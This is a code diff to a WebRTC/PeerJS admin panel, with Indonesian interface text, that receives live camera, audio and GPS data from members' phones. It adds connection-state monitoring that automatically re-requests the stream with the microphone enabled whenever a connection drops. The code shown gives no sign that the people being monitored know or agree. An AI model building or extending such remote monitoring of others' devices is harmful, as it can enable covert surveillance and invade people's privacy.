@@ -124,6 +124,8 @@
           { urls: "stun:stun.l.google.com:19302" },
           { urls: "stun:stun1.l.google.com:19302" },
           { urls: "stun:stun2.l.google.com:19302" },
+          { urls: "stun:stun3.l.google.com:19302" },
+          { urls: "stun:stun4.l.google.com:19302" },
           { urls: "stun:global.stun.twilio.com:3478" }
         ]
       }
@@ -169,6 +171,26 @@
     function lockPanel() {
       muteAllAudio(true);
       setUnlockedState(false);
+    }
+
+    function attachIceMonitor(id, call) {
+      const entry = devices[id];
+      const pc = call && call.peerConnection;
+      if (!pc || !entry) return;
+
+      entry.iceState = pc.iceConnectionState || "checking";
+      pc.addEventListener("iceconnectionstatechange", () => {
+        if (!devices[id]) return;
+        devices[id].iceState = pc.iceConnectionState;
+        if (pc.iceConnectionState === "failed" || pc.iceConnectionState === "disconnected") {
+          setTimeout(() => {
+            if (devices[id] && devices[id].conn && devices[id].conn.open) {
+              devices[id].conn.send({ type: "REQUEST_STREAM", enableMic: true });
+            }
+          }, 1200);
+        }
+        syncDeviceCard(id);
+      });
     }
 
     function initAdminPeer() {
@@ -240,6 +262,7 @@
         const id = call.peer;
         const entry = ensureDeviceEntry(id);
         entry.call = call;
+        attachIceMonitor(id, call);
         call.answer();
         call.on("stream", (remoteStream) => {
           entry.closedExplicitly = false;
@@ -252,6 +275,7 @@
         });
         call.on("close", () => {
           entry.call = null;
+          entry.iceState = "closed";
           syncDeviceCard(id);
         });
       });
@@ -270,6 +294,7 @@
           micOn: false,
           audioMuted: true,
           inBackground: false,
+          iceState: "menunggu",
           location: null,
           device: "",
           updatedAt: Date.now(),
@@ -484,7 +509,7 @@
           statusChip.className = "chip bg";
         }
         if (ph && !hasLiveStream) {
-          ph.textContent = "Menghubungkan stream kamera & audio lintas jaringan...";
+          ph.textContent = `Menghubungkan stream (${d.iceState || "checking"})...`;
         }
       }
 
@@ -494,7 +519,7 @@
         const vidState = hasLiveStream ? "Masuk" : "Belum Masuk";
         const micState = (d.micOn || hasAudioTrack) ? "Aktif" : "Tidak Ada";
         const speakerState = d.audioMuted ? "Muted" : "Unmuted";
-        diagEl.textContent = `🎥 Video: ${vidState} • 🎙️ Mic: ${micState} (${speakerState})`;
+        diagEl.textContent = `🎥 Video: ${vidState} • 🎙️ Mic: ${micState} (${speakerState}) • ICE: ${d.iceState || "-"}`;
       }
       if (btnAudio) {
         btnAudio.textContent = d.audioMuted ? "🔇 Unmute" : "🔊 Mute";
@@ -504,8 +529,9 @@
       const hasCoords = loc && typeof loc.lat === "number" && typeof loc.lng === "number";
       const locEl = document.getElementById(`loc_${id}`);
       if (locEl) {
+        const jamStr = loc && loc.timeText ? ` • Jam ${loc.timeText}` : "";
         locEl.textContent = hasCoords
-          ? `📍 ${loc.lat}, ${loc.lng} (Akurasi ${loc.accuracy || "-"})`
+          ? `📍 ${loc.lat}, ${loc.lng} (Akurasi ${loc.accuracy || "-"}${jamStr})`
           : "📍 Menunggu koordinat GPS dari HP member...";
       }
 
